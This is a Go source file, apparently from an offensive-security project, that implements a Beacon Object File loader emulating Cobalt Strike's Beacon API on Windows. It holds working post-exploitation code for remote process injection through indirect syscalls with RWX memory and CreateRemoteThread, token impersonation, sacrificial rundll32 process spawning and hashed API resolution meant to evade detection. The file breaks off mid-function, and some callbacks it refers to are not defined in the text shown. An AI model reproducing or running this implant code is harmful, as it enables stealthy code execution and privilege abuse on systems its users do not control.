package loader

import (
	"encoding/binary"
	"fmt"
	"sync"
	"syscall"
	"unsafe"

	wc "github.com/carved4/go-wincall"
)

var (
	bofOutput struct {
		sync.Mutex
		buf []byte
		len int
	}

	keyStore     = make(map[string]uintptr)
	keyStoreLock sync.Mutex

	emptyStringBuf = []byte{0, 0, 0, 0}

	callbacksOnce       sync.Once
	beaconOutputCb      uintptr
	beaconPrintfCb      uintptr
	beaconDataParseCb   uintptr
	beaconDataIntCb     uintptr
	beaconDataShortCb   uintptr
	beaconDataLengthCb  uintptr
	beaconDataExtractCb uintptr
	beaconAddValueCb    uintptr
	beaconGetValueCb    uintptr
	beaconRemoveValueCb uintptr
	toWideCharCb        uintptr
	genericStubCb       uintptr

	beaconFormatAllocCb    uintptr
	beaconFormatResetCb    uintptr
	beaconFormatFreeCb     uintptr
	beaconFormatAppendCb   uintptr
	beaconFormatPrintfCb   uintptr
	beaconFormatToStringCb uintptr
	beaconFormatIntCb      uintptr
	beaconUseTokenCb       uintptr
	beaconRevertTokenCb    uintptr
	beaconIsAdminCb        uintptr
	beaconGetSpawnToCb     uintptr
	beaconSpawnTempProcCb  uintptr
	beaconInjectProcCb     uintptr
	beaconInjectTempProcCb uintptr
	beaconCleanupProcCb    uintptr
	beaconGetOutputDataCb  uintptr
	beaconInformationCb    uintptr

	formatBuffers     = make(map[uintptr]*formatBuffer)
	formatBuffersLock sync.Mutex
	formatBufferIdSeq uintptr = 0x10000

	currentToken     uintptr
	currentTokenLock sync.Mutex

	beaconDataLongCb              uintptr
	beaconDataPtrCb               uintptr
	beaconDownloadCb              uintptr
	beaconVirtualAllocCb          uintptr
	beaconVirtualProtectCb        uintptr
	beaconVirtualFreeCb           uintptr
	beaconOpenProcessCb           uintptr
	beaconCloseHandleCb           uintptr
	beaconGetThreadContextCb      uintptr
	beaconSetThreadContextCb      uintptr
	beaconResumeThreadCb          uintptr
	beaconOpenThreadCb            uintptr
	beaconReadProcessMemoryCb     uintptr
	beaconWriteProcessMemoryCb    uintptr
	beaconUnmapViewOfFileCb       uintptr
	beaconVirtualQueryCb          uintptr
	beaconDuplicateHandleCb       uintptr
	beaconGetCustomUserDataCb     uintptr
	beaconGetSyscallInformationCb uintptr

	userDataBuf = make([]byte, 32)
)

type datap struct {
	original uintptr
	buffer   uintptr
	length   uint32
	size     uint32
}

type formatBuffer struct {
	id       uintptr
	data     []byte
	capacity int
}

type formatp struct {
	original uintptr
	buffer   uintptr
	length   uint32
	size     uint32
}

func initCallbacks() {
	callbacksOnce.Do(func() {
		beaconOutputCb = syscall.NewCallback(beaconOutputCallback)
		beaconPrintfCb = syscall.NewCallback(beaconPrintfCallback)
		beaconDataParseCb = syscall.NewCallback(beaconDataParseCallback)
		beaconDataIntCb = syscall.NewCallback(beaconDataIntCallback)
		beaconDataShortCb = syscall.NewCallback(beaconDataShortCallback)
		beaconDataLengthCb = syscall.NewCallback(beaconDataLengthCallback)
		beaconDataExtractCb = syscall.NewCallback(beaconDataExtractCallback)
		beaconAddValueCb = syscall.NewCallback(beaconAddValueCallback)
		beaconGetValueCb = syscall.NewCallback(beaconGetValueCallback)
		beaconRemoveValueCb = syscall.NewCallback(beaconRemoveValueCallback)
		toWideCharCb = syscall.NewCallback(toWideCharCallback)
		genericStubCb = syscall.NewCallback(genericStubCallback)

		beaconFormatAllocCb = syscall.NewCallback(beaconFormatAllocCallback)
		beaconFormatResetCb = syscall.NewCallback(beaconFormatResetCallback)
		beaconFormatFreeCb = syscall.NewCallback(beaconFormatFreeCallback)
		beaconFormatAppendCb = syscall.NewCallback(beaconFormatAppendCallback)
		beaconFormatPrintfCb = syscall.NewCallback(beaconFormatPrintfCallback)
		beaconFormatToStringCb = syscall.NewCallback(beaconFormatToStringCallback)
		beaconFormatIntCb = syscall.NewCallback(beaconFormatIntCallback)
		beaconUseTokenCb = syscall.NewCallback(beaconUseTokenCallback)
		beaconRevertTokenCb = syscall.NewCallback(beaconRevertTokenCallback)
		beaconIsAdminCb = syscall.NewCallback(beaconIsAdminCallback)
		beaconGetSpawnToCb = syscall.NewCallback(beaconGetSpawnToCallback)
		beaconSpawnTempProcCb = syscall.NewCallback(beaconSpawnTemporaryProcessCallback)
		beaconInjectProcCb = syscall.NewCallback(beaconInjectProcessCallback)
		beaconInjectTempProcCb = syscall.NewCallback(beaconInjectTemporaryProcessCallback)
		beaconCleanupProcCb = syscall.NewCallback(beaconCleanupProcessCallback)
		beaconGetOutputDataCb = syscall.NewCallback(beaconGetOutputDataCallback)
		beaconInformationCb = syscall.NewCallback(beaconInformationCallback)

		beaconDataLongCb = syscall.NewCallback(beaconDataLongCallback)
		beaconDataPtrCb = syscall.NewCallback(beaconDataPtrCallback)
		beaconDownloadCb = syscall.NewCallback(beaconDownloadCallback)

		beaconVirtualAllocCb = syscall.NewCallback(beaconVirtualAllocCallback)
		beaconVirtualProtectCb = syscall.NewCallback(beaconVirtualProtectCallback)
		beaconVirtualFreeCb = syscall.NewCallback(beaconVirtualFreeCallback)
		beaconOpenProcessCb = syscall.NewCallback(beaconOpenProcessCallback)
		beaconCloseHandleCb = syscall.NewCallback(beaconCloseHandleCallback)
		beaconGetThreadContextCb = syscall.NewCallback(beaconGetThreadContextCallback)
		beaconSetThreadContextCb = syscall.NewCallback(beaconSetThreadContextCallback)
		beaconResumeThreadCb = syscall.NewCallback(beaconResumeThreadCallback)
		beaconOpenThreadCb = syscall.NewCallback(beaconOpenThreadCallback)
		beaconReadProcessMemoryCb = syscall.NewCallback(beaconReadProcessMemoryCallback)
		beaconWriteProcessMemoryCb = syscall.NewCallback(beaconWriteProcessMemoryCallback)
		beaconUnmapViewOfFileCb = syscall.NewCallback(beaconUnmapViewOfFileCallback)
		beaconVirtualQueryCb = syscall.NewCallback(beaconVirtualQueryCallback)
		beaconDuplicateHandleCb = syscall.NewCallback(beaconDuplicateHandleCallback)

		beaconGetCustomUserDataCb = syscall.NewCallback(beaconGetCustomUserDataCallback)
		beaconGetSyscallInformationCb = syscall.NewCallback(beaconGetSyscallInformationCallback)
	})
}

func SetupBofOutput(buf []byte) {
	bofOutput.Lock()
	bofOutput.buf = buf
	bofOutput.len = 0
	bofOutput.Unlock()
}

func GetBofOutput() ([]byte, int) {
	bofOutput.Lock()
	defer bofOutput.Unlock()
	return bofOutput.buf, bofOutput.len
}

func ResetBofOutputLen() {
	bofOutput.Lock()
	bofOutput.len = 0
	bofOutput.Unlock()
}

func beaconOutputCallback(outputType int32, data uintptr, dataLen int32) uintptr {
	if data == 0 || dataLen <= 0 {
		return 0
	}

	bofOutput.Lock()
	defer bofOutput.Unlock()

	if bofOutput.buf == nil {
		return 0
	}

	remaining := len(bofOutput.buf) - bofOutput.len
	toCopy := int(dataLen)
	if toCopy > remaining {
		toCopy = remaining
	}

	if toCopy > 0 {

		src := unsafe.Slice((*byte)(unsafe.Pointer(data)), toCopy)
		copy(bofOutput.buf[bofOutput.len:], src)
		bofOutput.len += toCopy
	}

	return 1
}

func beaconPrintfCallback(outputType int32, fmtPtr uintptr,
	arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9 uintptr) uintptr {
	if fmtPtr == 0 {
		return 0
	}

	fmtStr := readCString(fmtPtr)
	if fmtStr == "" {
		return 0
	}

	args := []uintptr{arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9}
	result := processFormatString(fmtStr, args)

	bofOutput.Lock()
	defer bofOutput.Unlock()

	if bofOutput.buf == nil {
		return 0
	}

	remaining := len(bofOutput.buf) - bofOutput.len
	toCopy := len(result)
	if toCopy > remaining {
		toCopy = remaining
	}

	if toCopy > 0 {
		copy(bofOutput.buf[bofOutput.len:], result[:toCopy])
		bofOutput.len += toCopy
	}

	if bofOutput.len < len(bofOutput.buf) {
		bofOutput.buf[bofOutput.len] = '\n'
		bofOutput.len++
	}

	return 0
}

func processFormatString(format string, args []uintptr) string {
	result := ""
	argIdx := 0
	i := 0

	for i < len(format) {
		if format[i] == '%' && i+1 < len(format) {
			if format[i+1] == 'l' && i+2 < len(format) && (format[i+2] == 's' || format[i+2] == 'S') {
				if argIdx < len(args) {
					result += readWString(args[argIdx])
					argIdx++
				}
				i += 3
				continue
			}
			if format[i+1] == 'S' {
				if argIdx < len(args) {
					result += readWString(args[argIdx])
					argIdx++
				}
				i += 2
				continue
			}
			if format[i+1] == 'w' && i+2 < len(format) && format[i+2] == 's' {
				if argIdx < len(args) {
					result += readWString(args[argIdx])
					argIdx++
				}
				i += 3
				continue
			}
			if format[i+1] == 'l' && i+2 < len(format) {
				switch format[i+2] {
				case 'd', 'i':
					if argIdx < len(args) {
						result += fmt.Sprintf("%d", int64(args[argIdx]))
						argIdx++
					}
					i += 3
					continue
				case 'u':
					if argIdx < len(args) {
						result += fmt.Sprintf("%d", uint64(args[argIdx]))
						argIdx++
					}
					i += 3
					continue
				case 'x':
					if argIdx < len(args) {
						result += fmt.Sprintf("%x", args[argIdx])
						argIdx++
					}
					i += 3
					continue
				case 'X':
					if argIdx < len(args) {
						result += fmt.Sprintf("%X", args[argIdx])
						argIdx++
					}
					i += 3
					continue
				}
			}
			spec := format[i+1]
			switch spec {
			case 's':
				if argIdx < len(args) {
					s := readCString(args[argIdx])
					if len(s) < 5 {
						ws := readWString(args[argIdx])
						if len(ws) > len(s) {
							s = ws
						}
					}
					result += s
					argIdx++
				}
				i += 2
			case 'd', 'i':
				if argIdx < len(args) {
					result += fmt.Sprintf("%d", int32(args[argIdx]))
					argIdx++
				}
				i += 2
			case 'u':
				if argIdx < len(args) {
					result += fmt.Sprintf("%d", uint32(args[argIdx]))
					argIdx++
				}
				i += 2
			case 'x':
				if argIdx < len(args) {
					result += fmt.Sprintf("%x", args[argIdx])
					argIdx++
				}
				i += 2
			case 'X':
				if argIdx < len(args) {
					result += fmt.Sprintf("%X", args[argIdx])
					argIdx++
				}
				i += 2
			case 'p':
				if argIdx < len(args) {
					result += fmt.Sprintf("%x", args[argIdx])
					argIdx++
				}
				i += 2
			case '%':
				result += "%"
				i += 2
			case '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '+', ' ', '#', '.':
				j := i + 1
				for j < len(format) && (format[j] >= '0' && format[j] <= '9' || format[j] == '-' || format[j] == '+' || format[j] == ' ' || format[j] == '#' || format[j] == '.') {
					j++
				}
				if j < len(format) {
					finalSpec := format[j]
					switch finalSpec {
					case 's':
						if argIdx < len(args) {
							result += readCString(args[argIdx])
							argIdx++
						}
					case 'S':
						if argIdx < len(args) {
							result += readWString(args[argIdx])
							argIdx++
						}
					case 'd', 'i':
						if argIdx < len(args) {
							result += fmt.Sprintf("%d", int32(args[argIdx]))
							argIdx++
						}
					case 'u':
						if argIdx < len(args) {
							result += fmt.Sprintf("%d", uint32(args[argIdx]))
							argIdx++
						}
					case 'x':
						if argIdx < len(args) {
							result += fmt.Sprintf("%x", args[argIdx])
							argIdx++
						}
					case 'X':
						if argIdx < len(args) {
							result += fmt.Sprintf("%X", args[argIdx])
							argIdx++
						}
					default:
						if argIdx < len(args) {
							result += fmt.Sprintf("%v", args[argIdx])
							argIdx++
						}
					}
					i = j + 1
				} else {
					result += string(format[i])
					i++
				}
			default:
				if argIdx < len(args) {
					result += fmt.Sprintf("%v", args[argIdx])
					argIdx++
				}
				i += 2
			}
		} else {
			result += string(format[i])
			i++
		}
	}

	return result
}

func beaconDataParseCallback(parser uintptr, buffer uintptr, size uint32) uintptr {
	if parser == 0 {
		return 0
	}

	p := (*datap)(unsafe.Pointer(parser))

	if size < 4 || buffer == 0 {
		p.original = 0
		p.buffer = 0
		p.length = 0
		p.size = 0
		return 0
	}

	p.original = buffer
	p.buffer = buffer + 4
	p.length = size - 4
	p.size = size - 4

	return 1
}

func beaconDataIntCallback(parser uintptr) uintptr {
	if parser == 0 {
		return 0
	}

	p := (*datap)(unsafe.Pointer(parser))
	if p.length < 4 || p.buffer == 0 {
		return 0
	}

	val := *(*uint32)(unsafe.Pointer(p.buffer))

	p.buffer += 4
	p.length -= 4

	return uintptr(val)
}

func beaconDataShortCallback(parser uintptr) uintptr {
	if parser == 0 {
		return 0
	}

	p := (*datap)(unsafe.Pointer(parser))
	if p.length < 2 || p.buffer == 0 {
		return 0
	}

	val := *(*uint16)(unsafe.Pointer(p.buffer))

	p.buffer += 2
	p.length -= 2

	return uintptr(val)
}

func beaconDataLengthCallback(parser uintptr) uintptr {
	if parser == 0 {
		return 0
	}

	p := (*datap)(unsafe.Pointer(parser))
	return uintptr(p.length)
}

func beaconDataExtractCallback(parser uintptr, outSize uintptr) uintptr {
	if parser == 0 {

		if outSize != 0 {
			*(*uint32)(unsafe.Pointer(outSize)) = 0
		}
		return uintptr(unsafe.Pointer(&emptyStringBuf[0]))
	}

	p := (*datap)(unsafe.Pointer(parser))
	if p.length < 4 || p.buffer == 0 {

		if outSize != 0 {
			*(*uint32)(unsafe.Pointer(outSize)) = 0
		}
		return uintptr(unsafe.Pointer(&emptyStringBuf[0]))
	}

	binaryLength := *(*uint32)(unsafe.Pointer(p.buffer))
	p.buffer += 4
	p.length -= 4

	if p.length < binaryLength {

		if outSize != 0 {
			*(*uint32)(unsafe.Pointer(outSize)) = 0
		}
		return uintptr(unsafe.Pointer(&emptyStringBuf[0]))
	}

	result := p.buffer

	if outSize != 0 {
		*(*uint32)(unsafe.Pointer(outSize)) = binaryLength
	}

	p.buffer += uintptr(binaryLength)
	p.length -= binaryLength

	return result
}

func beaconAddValueCallback(key uintptr, ptr uintptr) uintptr {
	if key == 0 {
		return 0
	}

	sKey := readCString(key)
	keyStoreLock.Lock()
	keyStore[sKey] = ptr
	keyStoreLock.Unlock()

	return 1
}

func beaconGetValueCallback(key uintptr) uintptr {
	if key == 0 {
		return 0
	}

	sKey := readCString(key)
	keyStoreLock.Lock()
	defer keyStoreLock.Unlock()

	if val, exists := keyStore[sKey]; exists {
		return val
	}
	return 0
}

func beaconRemoveValueCallback(key uintptr) uintptr {
	if key == 0 {
		return 0
	}

	sKey := readCString(key)
	keyStoreLock.Lock()
	defer keyStoreLock.Unlock()

	if _, exists := keyStore[sKey]; exists {
		delete(keyStore, sKey)
		return 1
	}
	return 0
}

func toWideCharCallback(src uintptr, dst uintptr, maxLen int32) uintptr {
	if src == 0 || dst == 0 || maxLen <= 0 {
		return 0
	}

	s := readCString(src)
	if s == "" {
		return 0
	}

	dstSlice := unsafe.Slice((*uint16)(unsafe.Pointer(dst)), maxLen)
	i := 0
	for _, r := range s {
		if i >= int(maxLen)-1 {
			break
		}
		if r < 0x10000 {
			dstSlice[i] = uint16(r)
			i++
		}
	}

	if i < int(maxLen) {
		dstSlice[i] = 0
	}

	return 1
}

func genericStubCallback() uintptr {
	return 0
}

func beaconFormatAllocCallback(formatPtr uintptr, maxsz int32) uintptr {
	if formatPtr == 0 || maxsz <= 0 {
		return 0
	}

	formatBuffersLock.Lock()
	defer formatBuffersLock.Unlock()

	formatBufferIdSeq++
	id := formatBufferIdSeq

	fb := &formatBuffer{
		id:       id,
		data:     make([]byte, 0, maxsz),
		capacity: int(maxsz),
	}
	formatBuffers[id] = fb

	fp := (*formatp)(unsafe.Pointer(formatPtr))
	fp.original = id
	fp.buffer = id
	fp.length = 0
	fp.size = uint32(maxsz)

	return 1
}

func beaconFormatResetCallback(formatPtr uintptr) uintptr {
	if formatPtr == 0 {
		return 0
	}

	fp := (*formatp)(unsafe.Pointer(formatPtr))
	id := fp.original

	formatBuffersLock.Lock()
	defer formatBuffersLock.Unlock()

	if fb, exists := formatBuffers[id]; exists {
		fb.data = fb.data[:0]
		fp.length = 0
	}

	return 1
}

func beaconFormatFreeCallback(formatPtr uintptr) uintptr {
	if formatPtr == 0 {
		return 0
	}

	fp := (*formatp)(unsafe.Pointer(formatPtr))
	id := fp.original

	formatBuffersLock.Lock()
	defer formatBuffersLock.Unlock()

	delete(formatBuffers, id)

	fp.original = 0
	fp.buffer = 0
	fp.length = 0
	fp.size = 0

	return 1
}

func beaconFormatAppendCallback(formatPtr uintptr, data uintptr, length int32) uintptr {
	if formatPtr == 0 || data == 0 || length <= 0 {
		return 0
	}

	fp := (*formatp)(unsafe.Pointer(formatPtr))
	id := fp.original

	formatBuffersLock.Lock()
	defer formatBuffersLock.Unlock()

	fb, exists := formatBuffers[id]
	if !exists {
		return 0
	}

	src := unsafe.Slice((*byte)(unsafe.Pointer(data)), length)
	remaining := fb.capacity - len(fb.data)
	toAppend := int(length)
	if toAppend > remaining {
		toAppend = remaining
	}

	if toAppend > 0 {
		fb.data = append(fb.data, src[:toAppend]...)
		fp.length = uint32(len(fb.data))
	}

	return 1
}

func beaconFormatPrintfCallback(formatPtr uintptr, fmtPtr uintptr,
	arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9 uintptr) uintptr {
	if formatPtr == 0 || fmtPtr == 0 {
		return 0
	}

	fmtStr := readCString(fmtPtr)
	if fmtStr == "" {
		return 0
	}

	args := []uintptr{arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9}
	result := processFormatString(fmtStr, args)

	fp := (*formatp)(unsafe.Pointer(formatPtr))
	id := fp.original

	formatBuffersLock.Lock()
	defer formatBuffersLock.Unlock()

	fb, exists := formatBuffers[id]
	if !exists {
		return 0
	}

	remaining := fb.capacity - len(fb.data)
	toAppend := len(result)
	if toAppend > remaining {
		toAppend = remaining
	}

	if toAppend > 0 {
		fb.data = append(fb.data, result[:toAppend]...)
		fp.length = uint32(len(fb.data))
	}

	return 1
}

func beaconFormatToStringCallback(formatPtr uintptr, outLen uintptr) uintptr {
	if formatPtr == 0 {
		if outLen != 0 {
			*(*int32)(unsafe.Pointer(outLen)) = 0
		}
		return uintptr(unsafe.Pointer(&emptyStringBuf[0]))
	}

	fp := (*formatp)(unsafe.Pointer(formatPtr))
	id := fp.original

	formatBuffersLock.Lock()
	defer formatBuffersLock.Unlock()

	fb, exists := formatBuffers[id]
	if !exists || len(fb.data) == 0 {
		if outLen != 0 {
			*(*int32)(unsafe.Pointer(outLen)) = 0
		}
		return uintptr(unsafe.Pointer(&emptyStringBuf[0]))
	}

	if outLen != 0 {
		*(*int32)(unsafe.Pointer(outLen)) = int32(len(fb.data))
	}

	return uintptr(unsafe.Pointer(&fb.data[0]))
}

func beaconFormatIntCallback(formatPtr uintptr, value int32) uintptr {
	if formatPtr == 0 {
		return 0
	}

	fp := (*formatp)(unsafe.Pointer(formatPtr))
	id := fp.original

	formatBuffersLock.Lock()
	defer formatBuffersLock.Unlock()

	fb, exists := formatBuffers[id]
	if !exists {
		return 0
	}

	remaining := fb.capacity - len(fb.data)
	if remaining < 4 {
		return 0
	}

	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, uint32(value))
	fb.data = append(fb.data, buf...)
	fp.length = uint32(len(fb.data))

	return 1
}

func beaconUseTokenCallback(token uintptr) uintptr {
	if token == 0 {
		return 0
	}

	currentTokenLock.Lock()
	defer currentTokenLock.Unlock()

	currThread, _, _ := wc.Call("kernel32.dll", "GetCurrentThread")
	ret, _, _ := wc.Call("advapi32.dll", "SetThreadToken", uintptr(unsafe.Pointer(&currThread)), token)
	if ret == 0 {
		return 0
	}

	currentToken = token
	return 1
}

func beaconRevertTokenCallback() uintptr {
	currentTokenLock.Lock()
	defer currentTokenLock.Unlock()

	currThread, _, _ := wc.Call("kernel32.dll", "GetCurrentThread")
	wc.Call("advapi32.dll", "SetThreadToken", uintptr(unsafe.Pointer(&currThread)), 0)
	currentToken = 0

	return 1
}

func beaconIsAdminCallback() uintptr {
	var adminSid uintptr
	var identAuth [6]byte
	identAuth[5] = 5

	ret, _, _ := wc.Call("advapi32.dll", "AllocateAndInitializeSid",
		uintptr(unsafe.Pointer(&identAuth[0])),
		2,
		32,
		544,
		0, 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&adminSid)))

	if ret == 0 || adminSid == 0 {
		return 0
	}

	defer wc.Call("advapi32.dll", "FreeSid", adminSid)

	var isMember int32
	ret, _, _ = wc.Call("advapi32.dll", "CheckTokenMembership",
		0,
		adminSid,
		uintptr(unsafe.Pointer(&isMember)))

	if ret != 0 && isMember != 0 {
		return 1
	}

	return 0
}

func beaconGetSpawnToCallback(x86 int32, buffer uintptr, maxLen int32) uintptr {
	if buffer == 0 || maxLen <= 0 {
		return 0
	}

	var spawnTo string
	if x86 != 0 {
		spawnTo = "C:\\Windows\\SysWOW64\\rundll32.exe"
	} else {
		spawnTo = "C:\\Windows\\System32\\rundll32.exe"
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(buffer)), maxLen)
	copyLen := len(spawnTo)
	if copyLen >= int(maxLen) {
		copyLen = int(maxLen) - 1
	}
	copy(dst, spawnTo[:copyLen])
	dst[copyLen] = 0

	return 1
}

func beaconSpawnTemporaryProcessCallback(x86 int32, ignoreToken int32, startupInfo uintptr, processInfo uintptr) uintptr {
	if startupInfo == 0 || processInfo == 0 {
		return 0
	}

	var spawnTo string
	if x86 != 0 {
		spawnTo = "C:\\Windows\\SysWOW64\\rundll32.exe"
	} else {
		spawnTo = "C:\\Windows\\System32\\rundll32.exe"
	}

	cmdLine := make([]uint16, len(spawnTo)+1)
	for i, c := range spawnTo {
		cmdLine[i] = uint16(c)
	}

	var createFlags uint32 = 0x00000004

	currentTokenLock.Lock()
	token := currentToken
	currentTokenLock.Unlock()

	var ret uintptr
	if token != 0 && ignoreToken == 0 {
		ret, _, _ = wc.Call("advapi32.dll", "CreateProcessAsUserW",
			token,
			0,
			uintptr(unsafe.Pointer(&cmdLine[0])),
			0, 0, 0,
			uintptr(createFlags),
			0, 0,
			startupInfo,
			processInfo)
	} else {
		ret, _, _ = wc.Call("kernel32.dll", "CreateProcessW",
			0,
			uintptr(unsafe.Pointer(&cmdLine[0])),
			0, 0, 0,
			uintptr(createFlags),
			0, 0,
			startupInfo,
			processInfo)
	}

	if ret == 0 {
		return 0
	}

	return 1
}

func beaconInjectProcessCallback(hProcess uintptr, pid int32, payload uintptr, payloadLen int32, offset int32, arg uintptr, argLen int32) uintptr {
	if payload == 0 || payloadLen <= 0 {
		return 0
	}

	targetProc := hProcess
	if targetProc == 0 && pid > 0 {
		targetProc, _, _ = wc.Call("kernel32.dll", "OpenProcess", 0x001FFFFF, 0, uintptr(pid))
		if targetProc == 0 {
			return 0
		}
		defer wc.Call("kernel32.dll", "CloseHandle", targetProc)
	}

	if targetProc == 0 {
		return 0
	}

	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
	var remoteAddr uintptr
	regionSize := uintptr(payloadLen)
	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address,
		targetProc, uintptr(unsafe.Pointer(&remoteAddr)), 0,
		uintptr(unsafe.Pointer(&regionSize)),
		0x00001000|0x00002000, 0x40)
	if ret != 0 || remoteAddr == 0 {
		return 0
	}

	ntWrite := wc.GetSyscall(wc.GetHash("NtWriteVirtualMemory"))
	var written uintptr
	ret, _ = wc.IndirectSyscall(ntWrite.SSN, ntWrite.Address,
		targetProc, remoteAddr, payload, uintptr(payloadLen), uintptr(unsafe.Pointer(&written)))
	if ret != 0 {
		return 0
	}

	var threadId uintptr
	hThread, _, _ := wc.Call("kernel32.dll", "CreateRemoteThread",
		targetProc, 0, 0, remoteAddr+uintptr(offset), arg, 0, uintptr(unsafe.Pointer(&threadId)))
	if hThread == 0 {
		return 0
	}

	wc.Call("kernel32.dll", "CloseHandle", hThread)

	return 1
}

func beaconInjectTemporaryProcessCallback(processInfo uintptr, payload uintptr, payloadLen int32, offset int32, arg uintptr, argLen int32) uintptr {
	if processInfo == 0 || payload == 0 || payloadLen <= 0 {
		return 0
	}

	hProcess := *(*uintptr)(unsafe.Pointer(processInfo))
	if hProcess == 0 {
		return 0
	}

	return beaconInjectProcessCallback(hProcess, 0, payload, payloadLen, offset, arg, argLen)
}

func beaconCleanupProcessCallback(processInfo uintptr) uintptr {
	if processInfo == 0 {
		return 0
	}

	hProcess := *(*uintptr)(unsafe.Pointer(processInfo))
	hThread := *(*uintptr)(unsafe.Pointer(processInfo + 8))

	if hThread != 0 {
		wc.Call("kernel32.dll", "CloseHandle", hThread)
		*(*uintptr)(unsafe.Pointer(processInfo + 8)) = 0
	}

	if hProcess != 0 {
		wc.Call("kernel32.dll", "CloseHandle", hProcess)
		*(*uintptr)(unsafe.Pointer(processInfo)) = 0
	}

	return 1
}

func beaconGetOutputDataCallback(outData uintptr, outLen uintptr) uintptr {
	bofOutput.Lock()
	defer bofOutput.Unlock()

	if bofOutput.buf == nil || bofOutput.len == 0 {
		if outData != 0 {
			*(*uintptr)(unsafe.Pointer(outData)) = 0
		}
		if outLen != 0 {
			*(*int32)(unsafe.Pointer(outLen)) = 0
		}
		return 0
	}

	if outData != 0 {
		*(*uintptr)(unsafe.Pointer(outData)) = uintptr(unsafe.Pointer(&bofOutput.buf[0]))
	}
	if outLen != 0 {
		*(*int32)(unsafe.Pointer(outLen)) = int32(bofOutput.len)
	}

	return 1
}

func beaconInformationCallback(info uintptr) uintptr {
	if info == 0 {
		return 0
	}

	pid, _, _ := wc.Call("kernel32.dll", "GetCurrentProcessId")
	ppid := getParentPid()

	infoStruct := (*struct {
		Version       int32
		Sleeptime     int32
		Maxget        int32
		x86           int32
		Pid           int32
		HighIntegrity int32
		Ppid          int32
	})(unsafe.Pointer(info))

	infoStruct.Version = 0x01
	infoStruct.Sleeptime = 5000
	infoStruct.Maxget = 1024 * 1024
	infoStruct.x86 = 0
	infoStruct.Pid = int32(pid)
	infoStruct.HighIntegrity = int32(beaconIsAdminCallback())
	infoStruct.Ppid = int32(ppid)

	return 1
}

func getParentPid() uint32 {
	type processBasicInfo struct {
		Reserved1       uintptr
		PebBaseAddress  uintptr
		Reserved2       [2]uintptr
		UniqueProcessId uintptr
		ParentPid       uintptr
	}

	var pbi processBasicInfo
	var returnLength uint32

	ntdll := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	ntQueryInfo := wc.GetFunctionAddress(ntdll, wc.GetHash("NtQueryInformationProcess"))
	if ntQueryInfo == 0 {
		return 0
	}

	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
	wc.CallG0(ntQueryInfo, currProc, 0, uintptr(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&returnLength)))

	return uint32(pbi.ParentPid)
}

func readCString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	var buf []byte
	for i := uintptr(0); i < 8192; i++ {
		b := *(*byte)(unsafe.Pointer(ptr + i))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}

func readWString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	var chars []uint16
	for i := uintptr(0); i < 8192; i += 2 {
		c := *(*uint16)(unsafe.Pointer(ptr + i))
		if c == 0 {
			break
		}
		chars = append(chars, c)
	}

	runes := make([]rune, len(chars))
	for i, c := range chars {
		runes[i] = rune(c)
	}
	return string(runes)
}

func GetBeaconCallback(name string) uintptr {
	initCallbacks()

	switch name {
	case "BeaconOutput":
		return beaconOutputCb
	case "BeaconPrintf":
		return beaconPrintfCb
	case "BeaconDataParse":
		return beaconDataParseCb
	case "BeaconDataInt":
		return beaconDataIntCb
	case "BeaconDataShort":
		return beaconDataShortCb
	case "BeaconDataLength":
		return beaconDataLengthCb
	case "BeaconDataExtract":
		return beaconDataExtractCb
	case "BeaconAddValue":
		return beaconAddValueCb
	case "BeaconGetValue":
		return beaconGetValueCb
	case "BeaconRemoveValue":
		return beaconRemoveValueCb
	case "toWideChar":
		return toWideCharCb
	case "BeaconFormatAlloc":
		return beaconFormatAllocCb
	case "BeaconFormatReset":
		return beaconFormatResetCb
	case "BeaconFormatFree":
		return beaconFormatFreeCb
	case "BeaconFormatAppend":
		return beaconFormatAppendCb
	case "BeaconFormatPrintf":
		return beaconFormatPrintfCb
	case "BeaconFormatToString":
		return beaconFormatToStringCb
	case "BeaconFormatInt":
		return beaconFormatIntCb
	case "BeaconUseToken":
		return beaconUseTokenCb
	case "BeaconRevertToken":
		return beaconRevertTokenCb
	case "BeaconIsAdmin":
		return beaconIsAdminCb
	case "BeaconGetSpawnTo":
		return beaconGetSpawnToCb
	case "BeaconSpawnTemporaryProcess":
		return beaconSpawnTempProcCb
	case "BeaconInjectProcess":
		return beaconInjectProcCb
	case "BeaconInjectTemporaryProcess":
		return beaconInjectTempProcCb
	case "BeaconCleanupProcess":
		return beaconCleanupProcCb
	case "BeaconGetOutputData":
		return beaconGetOutputDataCb
	case "BeaconInformation":
		return beaconInformationCb
	case "BeaconDataLong":
		return beaconDataLongCb
	case "BeaconDataPtr":
		return beaconDataPtrCb
	case "BeaconDownload":
		return beaconDownloadCb
	case "BeaconVirtualAlloc":
		return beaconVirtualAllocCb
	case "BeaconVirtualProtect":
		return beaconVirtualProtectCb
	case "BeaconVirtualFree":
		return beaconVirtualFreeCb
	case "BeaconOpenProcess":
		return beaconOpenProcessCb
	case "BeaconCloseHandle":
		return beaconCloseHandleCb
	case "BeaconGetThreadContext":
		return beaconGetThreadContextCb
	case "BeaconSetThreadContext":
		return beaconSetThreadContextCb
	case "BeaconResumeThread":
		return beaconResumeThreadCb
	case "BeaconOpenThread":
		return beaconOpenThreadCb
	case "BeaconReadProcessMemory":
		return beaconReadProcessMemoryCb
	case "BeaconWriteProcessMemory":
		return beaconWriteProcessMemoryCb
	case "BeaconUnmapViewOfFile":
		return beaconUnmapViewOfFileCb
	case "BeaconVirtualQuery":
		return beaconVirtualQueryCb
	case "BeaconDuplicateHandle":
		return beaconDuplicateHandleCb
	case "BeaconGetCustomUserData":
		return beaconGetCustomUserDataCb
	case "BeaconGetSyscallInformation":
